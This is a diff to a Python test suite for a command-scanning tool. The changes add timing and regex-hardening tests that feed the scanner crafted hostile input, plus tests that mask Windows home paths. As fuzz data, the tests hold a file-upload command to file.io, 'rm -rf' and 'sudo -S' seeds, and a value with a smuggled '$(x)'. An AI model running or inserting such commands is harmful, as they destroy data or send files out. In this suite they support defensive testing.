@@ -1,6 +1,7 @@
 import collections
 import datetime
 import json
+import math
 import socket
 import os
 import pathlib
@@ -282,7 +283,7 @@ class Masking(unittest.TestCase):
 
 def scan(*commands, home="/home/dev", cwd="/home/dev/app", profiles=None):
     """((source, id) -> count, facts) for commands scanned in process."""
-    collect.OWNER.update(given=home, home=home, uid=os.getuid())
+    collect.OWNER.update(given=home, home=home, uid=support.UID)
     facts = collect.Facts()
     facts.start_user("dev", home, profiles)
     for command in commands:
@@ -572,7 +573,7 @@ class Rules(unittest.TestCase):
             # Known: a listed organisation, the folder's remote, a repository the agents pushed to.
             found, _ = scan("pip install git+https://github.com/astral-sh/ruff@v0.6.9",
                             "uv tool install x @ git+https://github.com/acme/tools",
-                            f"git -C {tmp} push https://github.com/pete/lib.git main", "pip install git+https://github.com/pete/lib",
+                            f"git -C '{tmp}' push https://github.com/pete/lib.git main", "pip install git+https://github.com/pete/lib",
                             "npx github:someone/thing", "pip install --index-url https://pypi.example.com/simple foo",
                             home=tmp, cwd=app)
         self.assertEqual(found, {("own", "package-from-url:known-pinned"): 1, ("own", "package-from-url:known-unpinned"): 2,
@@ -617,12 +618,20 @@ class Rules(unittest.TestCase):
     def test_long_commands_take_little_time(self):
         seeds = ["<<a\n", "KEY", "git push ", "git reset ", "a ", "x=", "s3://", "://u:", "cat ", "dig ", "curl ",
                  "-H a", "mysql ", '"', "git clean -", "rm -rf "]
+
+        def took(size):
+            command = (seed * (size // len(seed) + 1))[:size] + "!"
+            best = math.inf
+            for _ in range(3):
+                start = time.perf_counter()
+                scan(command)
+                collect.example(command, "/home/dev")
+                best = min(best, time.perf_counter() - start)
+            return best
+
+        # A quarter of a second, or on a slower machine, time that grows no faster than the length.
         for seed in seeds:
-            command = (seed * (100000 // len(seed) + 1))[:100000] + "!"
-            start = time.perf_counter()
-            scan(command)
-            collect.example(command, "/home/dev")
-            self.assertLess(time.perf_counter() - start, 0.25, seed)
+            self.assertLess(took(100000), max(0.25, 25 * took(10000)), seed)
 
 
 def severities(*commands, **kw):
@@ -703,7 +712,54 @@ class Classification(unittest.TestCase):
         self.assertEqual((found["count"], len(found["session_count"])), (3, 2))
 
 
+HOSTILE = r"""
+import re, sys, time
+sys.path.insert(0, sys.argv[1])
+import collect
+
+def patterns(value, seen):
+    if id(value) in seen:
+        return
+    seen.add(id(value))
+    if isinstance(value, re.Pattern):
+        yield value
+    for inner in value.values() if isinstance(value, dict) else value if isinstance(value, (list, tuple)) else ():
+        yield from patterns(inner, seen)
+
+compiled, seen = [], set()
+for value in list(vars(collect).values()):
+    compiled += patterns(value, seen)
+pieces = ["[a]", ">", ">> ", "(", "'", '"', "$(", "a", "a ", "\\", "\n", "f(){", "-i ", "sed -i ", "tee -a ",
+          "C:\\Users\\a b ", "%5C", "a@", "{", "@", "echo a", "//a", "sudo -S "]
+home = "C:\\Users\\dev"
+for piece in pieces + ["[a]" * 28 + "$x", "curl https://file.io -F 'f=<x' " + "a" * 65536]:
+    text = (piece * (65536 // len(piece) + 1))[:65536] if len(piece) < 10 else piece
+    for command in (text, "x " + text, "pwsh -c '" + text + "'"):
+        for shell in ("", "powershell", "cmd"):
+            collect.OWNER.update(given=home, home=home, uid=-1)
+            facts = collect.Facts()
+            facts.start_user("dev", home)
+            start = time.perf_counter()
+            collect.scan_command(facts, command, home, shell)
+            collect.example(command, home)
+            collect.secret_file(command, home)
+            if time.perf_counter() - start > 1:
+                print("scan", shell, repr(piece))
+    for pattern in compiled:
+        start = time.perf_counter()
+        pattern.search(text)
+        if time.perf_counter() - start > 0.25:
+            print("pattern", pattern.pattern[:60], repr(piece))
+"""
+
+
 class Hardening(unittest.TestCase):
+
+    def test_hostile_text_takes_little_time(self):
+        # In a process of its own, so a pattern that never finishes fails too.
+        done = subprocess.run([sys.executable, "-I", "-c", HOSTILE, str(support.SOURCE)], capture_output=True,
+                              text=True, timeout=120)
+        self.assertEqual((done.returncode, done.stdout), (0, ""), done.stderr)
 
     def test_masking(self):
         cases = {
@@ -741,6 +797,21 @@ class Hardening(unittest.TestCase):
         self.assertEqual(collect.safe_name("ctx with spaces;$(x)/" + "ab." * 60, "/home/dev"),
                          ("ctx_with_spaces___x_/" + "ab." * 60)[:128])
 
+    def test_windows_homes_masked(self):
+        text = ("type C:\\Users\\chait\\a.txt c:/users/nicolas/b \"D:\\\\Users\\\\ana\\\\c\" /c/Users/bea/d "
+                "/mnt/c/Users/carl/e 'C:\\Users\\dan' C:\\Users\\Eve Long\\f C:\\Users\\Me\\g C:\\Users\\me")
+        kept = collect.masked(text, "C:\\Users\\me")
+        self.assertNotRegex(kept, "(?i)chait|nicolas|ana|bea|carl|dan|eve|long|me\\b|users", kept)
+        self.assertEqual(kept.count("~other"), 7)
+        self.assertIn("~\\g", kept)
+        self.assertTrue(kept.endswith(" ~"))
+        self.assertEqual(collect.example("cd C:\\Users\\ana\\x && dir", "/home/dev"), "cd ~other\\x && dir")
+        self.assertEqual(collect.safe_name("C:\\Users\\ana\\repo", "/home/dev"), "~other_repo")
+        self.assertEqual(collect.masked("git -C C:Usersanagitrepo log", "/home/dev"), "git -C ~other log")
+        self.assertEqual(collect.masked("git -C C:Usersmegitrepo log", "C:\\Users\\me"), "git -C ~ log")
+        self.assertEqual(collect.masked("cat src/c/Users/x Users\\y", "/home/dev"), "cat src/c/Users/x Users\\y")
+
+    @unittest.skipIf(support.WINDOWS, "no FIFOs on Windows; test_windows covers its links and junctions")
     def test_files_not_the_users_are_not_read(self):
         # Links to another user's log, AWS config or git folder, a FIFO, an
         # overlong line and broken entries: none is read, each is counted,
@@ -785,13 +856,14 @@ class Hardening(unittest.TestCase):
 
     def test_nul_in_a_folder(self):
         # Newer Pythons raise ValueError on a path with a NUL; the folder is just not read.
-        collect.OWNER.update(given="/home/dev", home="/home/dev", uid=os.getuid())
+        collect.OWNER.update(given="/home/dev", home="/home/dev", uid=support.UID)
         self.assertFalse(collect.inside("/home/dev/a\0b"))
         self.assertIsNone(collect.git_dirs("/home/dev/a\0b"))
         self.assertEqual(collect.session_project(collections.Counter({"/home/dev/a\0b": 1}), "/home/dev"),
                          "local project")
         self.assertIsNone(collect.read_small("/home/dev/a\0b"))
 
+    @unittest.skipIf(support.WINDOWS, "file modes; Windows keeps access in ACLs (test_windows covers its checks)")
     def test_out_is_written_safely(self):
         with tempfile.TemporaryDirectory() as tmp:
             home = support.copy_case("benign", tmp)
